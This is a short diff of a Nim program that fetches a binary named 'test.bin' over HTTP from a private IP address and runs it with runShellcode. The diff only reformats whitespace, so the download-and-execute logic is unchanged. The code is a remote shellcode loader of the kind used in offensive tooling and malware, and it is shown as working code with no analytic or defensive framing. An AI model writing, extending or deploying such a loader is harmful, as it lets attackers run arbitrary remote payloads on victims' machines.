@@ -87,10 +87,8 @@ when isMainModule:
             var client = newHttpClient()
             var url = 
             "http://10.90.248.103:80/test.bin"
-            var response: string = client.getContent(url) 
-            
-            shellcode = toByteSeq(response)                 
-            
+            var response: string = client.getContent(url)
+            shellcode = toByteSeq(response)
             runShellcode(shellcode) 
 
         #Download the payload over http
